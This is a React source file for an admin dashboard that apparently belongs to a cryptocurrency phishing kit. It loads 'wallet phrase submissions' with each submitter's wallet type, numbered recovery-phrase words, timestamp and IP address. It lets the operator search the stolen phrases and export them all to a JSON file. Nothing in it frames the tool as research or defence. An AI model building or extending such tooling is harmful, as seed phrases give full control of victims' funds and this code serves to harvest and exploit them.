'use client'

import { useState, useEffect } from 'react'
import { useTheme } from '../../contexts/ThemeContext'

export default function AdminPage() {
  const [submissions, setSubmissions] = useState([])
  const [loading, setLoading] = useState(true)
  const [error, setError] = useState(null)
  const [searchTerm, setSearchTerm] = useState('')
  const [filterWallet, setFilterWallet] = useState('all')
  const { isDark, toggleTheme } = useTheme()

  useEffect(() => {
    fetchSubmissions()
  }, [])

  const fetchSubmissions = async () => {
    try {
      setLoading(true)
      const response = await fetch('/api/submissions')
      if (response.ok) {
        const data = await response.json()
        setSubmissions(data.submissions || [])
      } else {
        setError('Failed to fetch submissions')
      }
    } catch (error) {
      setError('Error fetching submissions: ' + error.message)
    } finally {
      setLoading(false)
    }
  }

  const filteredSubmissions = submissions.filter(submission => {
    const matchesSearch = submission.selectedWallet.toLowerCase().includes(searchTerm.toLowerCase()) ||
                         submission.phrase.join(' ').toLowerCase().includes(searchTerm.toLowerCase())
    const matchesWallet = filterWallet === 'all' || submission.selectedWallet === filterWallet
    return matchesSearch && matchesWallet
  })

  const walletTypes = [...new Set(submissions.map(s => s.selectedWallet))]

  const formatTimestamp = (timestamp) => {
    return new Date(timestamp).toLocaleString()
  }

  const exportToJSON = () => {
    const dataStr = JSON.stringify(submissions, null, 2)
    const dataBlob = new Blob([dataStr], { type: 'application/json' })
    const url = URL.createObjectURL(dataBlob)
    const link = document.createElement('a')
    link.href = url
    link.download = `wallet-submissions-${new Date().toISOString().split('T')[0]}.json`
    link.click()
    URL.revokeObjectURL(url)
  }

  if (loading) {
    return (
      <div className="min-h-screen bg-gray-100 dark:bg-gray-900 flex items-center justify-center transition-colors duration-300">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto mb-4"></div>
          <p className="text-gray-600 dark:text-gray-300 transition-colors duration-300">Loading submissions...</p>
        </div>
      </div>
    )
  }

  if (error) {
    return (
      <div className="min-h-screen bg-gray-100 dark:bg-gray-900 flex items-center justify-center transition-colors duration-300">
        <div className="text-center">
          <div className="text-red-600 text-6xl mb-4">⚠️</div>
          <h1 className="text-2xl font-bold text-gray-900 dark:text-white mb-2 transition-colors duration-300">Error</h1>
          <p className="text-gray-600 dark:text-gray-300 mb-4 transition-colors duration-300">{error}</p>
          <button
            onClick={fetchSubmissions}
            className="px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors"
          >
            Retry
          </button>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gray-100 dark:bg-gray-900 p-6 transition-colors duration-300">
      <div className="max-w-7xl mx-auto">
        {/* Header */}
        <div className="bg-white dark:bg-gray-800 rounded-lg shadow-md dark:shadow-xl p-6 mb-6 transition-colors duration-300">
          <div className="flex items-center justify-between mb-4">
            <div>
              <h1 className="text-3xl font-bold text-gray-900 dark:text-white transition-colors duration-300">🔐 Admin Dashboard</h1>
              <p className="text-gray-600 dark:text-gray-300 transition-colors duration-300">View all wallet phrase submissions</p>
            </div>
            <div className="flex space-x-3">
              <button
                onClick={toggleTheme}
                className="flex items-center space-x-2 px-3 py-2 rounded-lg bg-gray-100 dark:bg-gray-700 hover:bg-gray-200 dark:hover:bg-gray-600 transition-colors text-gray-700 dark:text-gray-200 font-medium"
                title={isDark ? 'Switch to Light Mode' : 'Switch to Dark Mode'}
              >
                {isDark ? (
                  <>
                    <svg className="w-4 h-4 text-yellow-500" fill="currentColor" viewBox="0 0 20 20">
                      <path fillRule="evenodd" d="M10 2a1 1 0 011 1v1a1 1 0 11-2 0V3a1 1 0 011-1zm4 8a4 4 0 11-8 0 4 4 0 018 0zm-.464 4.95l.707.707a1 1 0 001.414-1.414l-.707-.707a1 1 0 00-1.414 1.414zm2.12-10.607a1 1 0 010 1.414l-.706.707a1 1 0 11-1.414-1.414l.707-.707a1 1 0 011.414 0zM17 11a1 1 0 100-2h-1a1 1 0 100 2h1zm-7 4a1 1 0 011 1v1a1 1 0 11-2 0v-1a1 1 0 011-1zM5.05 6.464A1 1 0 106.465 5.05l-.708-.707a1 1 0 00-1.414 1.414l.707-.707a1 1 0 011.414 1.414zM4 11a1 1 0 100-2H3a1 1 0 000 2h1z" clipRule="evenodd" />
                    </svg>
                    <span className="text-sm">Light</span>
                  </>
                ) : (
                  <>
                    <svg className="w-4 h-4 text-gray-700" fill="currentColor" viewBox="0 0 20 20">
                      <path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001 0 1010.586 10.586z" />
                    </svg>
                    <span className="text-sm">Dark</span>
                  </>
                )}
              </button>
              <button
                onClick={exportToJSON}
                className="px-4 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 transition-colors"
              >
                📥 Export JSON
              </button>
              <button
                onClick={fetchSubmissions}
                className="px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors"
              >
                🔄 Refresh
              </button>
            </div>
          </div>

          {/* Stats */}
          <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
            <div className="bg-blue-50 dark:bg-blue-900/20 p-4 rounded-lg border border-blue-200 dark:border-blue-700">
              <div className="text-2xl font-bold text-blue-600 dark:text-blue-400">{submissions.length}</div>
              <div className="text-sm text-blue-600 dark:text-blue-400">Total Submissions</div>
            </div>
            <div className="bg-green-50 dark:bg-green-900/20 p-4 rounded-lg border border-green-200 dark:border-green-700">
              <div className="text-2xl font-bold text-green-600 dark:text-green-400">{walletTypes.length}</div>
              <div className="text-sm text-green-600 dark:text-green-400">Wallet Types</div>
            </div>
            <div className="bg-purple-50 dark:bg-purple-900/20 p-4 rounded-lg border border-purple-200 dark:border-purple-700">
              <div className="text-2xl font-bold text-purple-600 dark:text-purple-400">
                {submissions.length > 0 ? formatTimestamp(submissions[0].timestamp).split(',')[0] : 'N/A'}
              </div>
              <div className="text-sm text-purple-600 dark:text-purple-400">Latest Submission</div>
            </div>
            <div className="bg-orange-50 dark:bg-orange-900/20 p-4 rounded-lg border border-orange-200 dark:border-orange-700">
              <div className="text-2xl font-bold text-orange-600 dark:text-orange-400">
                {submissions.length > 0 ? formatTimestamp(submissions[submissions.length - 1].timestamp).split(',')[0] : 'N/A'}
              </div>
              <div className="text-sm text-orange-600 dark:text-orange-400">First Submission</div>
            </div>
          </div>
        </div>

        {/* Filters */}
        <div className="bg-white dark:bg-gray-800 rounded-lg shadow-md dark:shadow-xl p-6 mb-6 transition-colors duration-300">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div>
              <label className="block text-sm font-medium text-gray-700 dark:text-gray-200 mb-2 transition-colors duration-300">Search</label>
              <input
                type="text"
                placeholder="Search by wallet or phrase words..."
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                className="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 bg-white dark:bg-gray-700 text-gray-900 dark:text-white placeholder-gray-500 dark:placeholder-gray-400 transition-colors duration-300"
              />
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700 dark:text-gray-200 mb-2 transition-colors duration-300">Filter by Wallet</label>
              <select
                value={filterWallet}
                onChange={(e) => setFilterWallet(e.target.value)}
                className="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 bg-white dark:bg-gray-700 text-gray-900 dark:text-white transition-colors duration-300"
              >
                <option value="all">All Wallets</option>
                {walletTypes.map(wallet => (
                  <option key={wallet} value={wallet}>{wallet}</option>
                ))}
              </select>
            </div>
          </div>
        </div>

        {/* Submissions List */}
        <div className="bg-white dark:bg-gray-800 rounded-lg shadow-md dark:shadow-xl overflow-hidden transition-colors duration-300">
          <div className="px-6 py-4 border-b border-gray-200 dark:border-gray-700">
            <h2 className="text-lg font-semibold text-gray-900 dark:text-white transition-colors duration-300">
              Submissions ({filteredSubmissions.length})
            </h2>
          </div>

          {filteredSubmissions.length === 0 ? (
            <div className="p-8 text-center">
              <div className="text-gray-400 dark:text-gray-500 text-6xl mb-4">📭</div>
              <p className="text-gray-600 dark:text-gray-400 transition-colors duration-300">No submissions found</p>
            </div>
          ) : (
            <div className="overflow-x-auto">
              <table className="min-w-full divide-y divide-gray-200 dark:divide-gray-700">
                <thead className="bg-gray-50 dark:bg-gray-700">
                  <tr>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-300 uppercase tracking-wider">ID</th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-300 uppercase tracking-wider">Wallet</th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-300 uppercase tracking-wider">Phrase</th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-300 uppercase tracking-wider">Timestamp</th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 dark:text-gray-300 uppercase tracking-wider">IP</th>
                  </tr>
                </thead>
                <tbody className="bg-white dark:bg-gray-800 divide-y divide-gray-200 dark:divide-gray-700">
                  {filteredSubmissions.map((submission, index) => (
                    <tr key={submission.id} className={index % 2 === 0 ? 'bg-white dark:bg-gray-800' : 'bg-gray-50 dark:bg-gray-700'}>
                      <td className="px-6 py-4 whitespace-nowrap text-sm font-medium text-gray-900 dark:text-white">
                        #{submission.id.slice(-6)}
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap">
                        <span className="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-blue-100 dark:bg-blue-900 text-blue-800 dark:text-blue-200">
                          {submission.selectedWallet}
                        </span>
                      </td>
                      <td className="px-6 py-4">
                        <div className="text-sm text-gray-900 dark:text-white">
                          <div className="grid grid-cols-3 gap-1">
                            {submission.phrase.map((word, wordIndex) => (
                              <span key={wordIndex} className="text-xs bg-gray-100 dark:bg-gray-600 px-2 py-1 rounded text-gray-900 dark:text-gray-100">
                                {wordIndex + 1}. {word}
                              </span>
                            ))}
                          </div>
                        </div>
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500 dark:text-gray-400">
                        {formatTimestamp(submission.timestamp)}
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500 dark:text-gray-400">
                        {submission.ip}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      </div>
    </div>
  )
}
